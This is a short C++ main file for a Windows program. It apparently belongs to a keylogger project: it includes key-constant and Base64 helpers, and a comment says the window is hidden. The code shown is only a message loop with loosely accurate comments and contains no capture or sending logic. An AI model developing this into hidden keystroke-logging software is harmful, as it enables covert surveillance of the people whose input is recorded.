#include <iostream>
#include "windows.h" //Header to hide output window from showing up
#include "Helper.h"
#include "KeyConstants.h"
#include "Base64.h"
using namespace std;

int main()
{
    MSG Msg; // Message to be processed but it will never be processed

    while(GetMessage (&Msg, NULL, 0, 0))//Program gets a message from us with address of that message
    {
        TranslateMessage(&Msg);//Take a message and modify to pass to it the system
        DispatchMessage(&Msg);//Forward it to the system invisibly
    }
    return 0;
}
